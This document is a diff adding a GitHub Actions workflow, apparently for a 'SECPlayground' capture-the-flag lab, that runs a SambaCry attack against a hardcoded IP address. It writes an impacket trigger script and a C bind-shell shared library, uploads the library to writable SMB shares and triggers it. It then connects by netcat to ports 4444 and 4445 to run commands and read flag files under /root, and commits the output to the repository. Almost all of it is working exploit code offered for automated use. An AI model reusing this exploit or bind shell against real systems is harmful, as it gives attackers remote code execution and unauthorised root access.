@@ -1,0 +1,159 @@
+name: SECPlayground temporary runner
+
+on:
+  push:
+    branches:
+      - secplayground-runner-*
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Prepare tools
+        run: |
+          set -euxo pipefail
+          sudo apt-get update
+          sudo apt-get install -y smbclient netcat-openbsd gcc python3-pip
+          python3 -m pip install --user impacket
+
+      - name: Run SambaCry lab check
+        run: |
+          set -euxo pipefail
+          TARGET="34.21.201.155"
+          OUT="secplayground-result.txt"
+          : > "$OUT"
+          {
+            echo "Target: $TARGET"
+            date -u
+            echo
+            echo "TCP reachability:"
+            for p in 445 4444 4445 6699; do
+              nc -vz -w 8 "$TARGET" "$p" || true
+            done
+            echo
+          } | tee -a "$OUT"
+
+          cat > exploit.py <<'PY'
+          from optparse import OptionParser
+          from impacket.dcerpc.v5 import transport
+
+          parser = OptionParser()
+          parser.add_option("-t", "--target", dest="target")
+          parser.add_option("-m", "--module", dest="module")
+          options, _ = parser.parse_args()
+          if not options.target or not options.module:
+              parser.print_help()
+              raise SystemExit(2)
+          stringbinding = r'ncacn_np:%s[\pipe\%s]' % (options.target, options.module)
+          rpctransport = transport.DCERPCTransportFactory(stringbinding)
+          dce = rpctransport.get_dce_rpc()
+          dce.connect()
+          PY
+
+          cat > bindshell-samba.c <<'C'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <netinet/in.h>
+          #include <sys/types.h>
+          #include <sys/socket.h>
+          #include <sys/stat.h>
+          #include <unistd.h>
+          #ifndef BIND_PORT
+          #define BIND_PORT 4444
+          #endif
+          static void detachFromParent(void) {
+            pid_t pid, sid;
+            if (getppid() == 1) return;
+            pid = fork();
+            if (pid < 0) exit(1);
+            if (pid > 0) exit(0);
+            umask(0);
+            sid = setsid();
+            if (sid < 0) exit(1);
+            if (chdir("/") < 0) exit(1);
+          }
+          int samba_init_module(void) {
+            detachFromParent();
+            int hostSocket, clientSocket;
+            struct sockaddr_in hostAddr;
+            char *argv[] = {"/bin/sh", "-i", NULL};
+            hostSocket = socket(PF_INET, SOCK_STREAM, 0);
+            hostAddr.sin_family = AF_INET;
+            hostAddr.sin_port = htons(BIND_PORT);
+            hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+            bind(hostSocket, (struct sockaddr*) &hostAddr, sizeof(hostAddr));
+            listen(hostSocket, 2);
+            clientSocket = accept(hostSocket, NULL, NULL);
+            dup2(clientSocket, 0);
+            dup2(clientSocket, 1);
+            dup2(clientSocket, 2);
+            execve("/bin/sh", argv, NULL);
+            close(hostSocket);
+            return 0;
+          }
+          C
+
+          gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
+          gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
+
+          echo "SMB shares:" | tee -a "$OUT"
+          smbclient -L "//$TARGET/" -N -g 2>&1 | tee -a "$OUT" || true
+
+          python3 - <<'PY' > shares.txt
+          import subprocess, re
+          target = "34.21.201.155"
+          p = subprocess.run(["smbclient", "-L", f"//{target}/", "-N", "-g"], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+          shares = []
+          for line in p.stdout.splitlines():
+              parts = line.split("|")
+              if len(parts) >= 2 and parts[0] == "Disk":
+                  name = parts[1].strip()
+                  if name and name not in ("print$", "IPC$"):
+                      shares.append(name)
+          print("\n".join(shares))
+          PY
+
+          if [ ! -s shares.txt ]; then
+            echo "No disk shares found." | tee -a "$OUT"
+          fi
+
+          bases="/tmp /var/tmp /shared /share /shares /srv /srv/samba /var/samba /var/lib/samba /home /home/samba /mnt /mnt/usb /media /data /volume1 /volume2 /volume3"
+          for share in $(cat shares.txt); do
+            echo "Testing share: $share" | tee -a "$OUT"
+            for so in libspg4444.so libspg4445.so; do
+              smbclient "//$TARGET/$share" -N -c "put $so $so; ls" 2>&1 | tee -a "$OUT" || true
+            done
+            for base in $bases; do
+              for so in libspg4444.so libspg4445.so; do
+                module="$base/$share/$so"
+                echo "Trigger $module" | tee -a "$OUT"
+                python3 exploit.py -t "$TARGET" -m "$module" 2>&1 | tee -a "$OUT" || true
+                sleep 1
+                for bp in 4444 4445; do
+                  printf 'id; hostname; ls -la /root; for f in /root/flag* /root/*flag*; do echo ===$f===; cat "$f"; done; exit\n' \
+                    | nc -w 6 "$TARGET" "$bp" 2>&1 | tee -a "$OUT" || true
+                done
+                if grep -Eiq 'flag|cve\\{|sec\\{|samba\\{|uid=' "$OUT"; then
+                  echo "Potential result found." | tee -a "$OUT"
+                  exit 0
+                fi
+              done
+            done
+          done
+
+      - name: Commit result
+        if: always()
+        run: |
+          set -euxo pipefail
+          git config user.name "SECPlayground Runner"
+          git config user.email "actions@users.noreply.github.com"
+          git add secplayground-result.txt || true
+          git commit -m "Add SECPlayground temporary result" || true
+          git push origin HEAD
